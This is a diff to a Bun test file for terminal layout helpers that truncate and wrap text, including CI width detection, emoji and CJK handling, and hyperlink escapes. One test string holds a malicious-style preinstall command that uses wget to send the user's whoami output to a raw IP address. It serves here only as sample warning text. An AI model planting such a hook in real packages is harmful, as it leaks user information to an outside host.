@@ -12,7 +12,9 @@ describe("terminal layout", () => {
     expect(columnsOf({})).toBeNull();
     expect(columnsOf({ isTTY: true, columns: 120 })).toBe(120);
     expect(columnsOf({ isTTY: true })).toBe(80);
-    expect(columnsOf({ isTTY: true, columns: 12 })).toBe(40);
+    expect(columnsOf({ isTTY: true, columns: 12 })).toBe(12);
+    expect(columnsOf({ isTTY: true, columns: 120 }, { CI: "true" })).toBeNull();
+    expect(columnsOf({ isTTY: true, columns: 120 }, { CI: "false" })).toBe(120);
   });
 
   test("a line that fits is left as it is", () => {
@@ -57,8 +59,36 @@ describe("terminal layout", () => {
     const out = truncate(`\x1b[2mpackage.json scripts.preinstall: wget --quiet "http://5.189.134.9:6060/?user=$(whoami)"${RESET}`, 40);
 
     expect(Bun.stringWidth(out)).toBe(40);
-    expect(out.endsWith(`${RESET}…`)).toBe(true);
+    expect(out.endsWith(`…${RESET}`)).toBe(true);
     expect(truncate("short", 40)).toBe("short");
+    expect(truncate("x".repeat(50), 10)).toBe(`${"x".repeat(9)}…`);
+  });
+
+  test("wide characters and emoji are cut and wrapped by whole characters, never past the width", () => {
+    const cjk = truncate(`        ${"界".repeat(25)}`, 40);
+
+    expect(Bun.stringWidth(cjk)).toBeLessThanOrEqual(40);
+    expect(cjk).toEndWith("…");
+    const emoji = "👩‍💻".repeat(60);
+    const wrapped = wrap(emoji, 50);
+
+    expect(widest(wrapped)).toBeLessThanOrEqual(50);
+    expect(wrapped.replace(/\n/g, "")).toBe(emoji);
+  });
+
+  test("a link escape is passed through once, not repeated or counted", () => {
+    const link = `\x1b]8;;https://apmjs.dev\x1b\\docs\x1b]8;;\x1b\\`;
+    const out = wrap(`see the ${link} for every flag apm reads and the way each one works`, 30);
+
+    expect(out.split("\x1b]8;;https://apmjs.dev").length).toBe(2);
+    expect(plain(out).replace(/\n */g, " ")).toBe("see the docs for every flag apm reads and the way each one works");
+  });
+
+  test("a narrow terminal keeps room for text: a deep indent gives way", () => {
+    const out = wrap("    advisory  MAL-2026-20430 (OSSF malicious-packages feed)", 20);
+
+    expect(widest(out)).toBeLessThanOrEqual(20);
+    expect(out.split("\n").every((l) => l.trim().length > 0)).toBe(true);
   });
 
   test("reflow joins hand-wrapped continuation lines and leaves new entries alone", () => {
